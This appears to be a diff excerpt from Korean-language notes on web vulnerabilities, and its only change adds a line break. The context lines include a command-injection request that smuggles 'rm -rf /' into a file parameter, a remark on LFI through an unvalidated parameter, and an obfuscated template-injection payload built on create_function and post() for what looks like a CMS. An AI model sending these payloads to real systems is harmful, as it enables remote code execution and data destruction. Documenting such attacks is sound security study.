@@ -99,6 +99,7 @@ GET /api.php?file=example.txt;rm%20-rf%20/
 
 ① query: s=captcha
 입력값 검증이 없고, 사용자가 s 파라미터에 임의의 값을 넣을 수 있다면 LFI 등이 발생할 수 있다.
+<br>
 ② tag/index=&tag=%7Bpbohome/Indexot:if(1)(usort/*%3e*/(post/*%3e*/(/*%3e*/1),create_function/*%3e*/(/*%3e*/post/*%3e*/(/*%3e*/2),post/*%3e*/(/*%3e*/3))));//)%7D(123)%7B/pbhome/Indexoot:if%7D&tagstpl=news.html&lnoc2tspfar1_ue
 
 
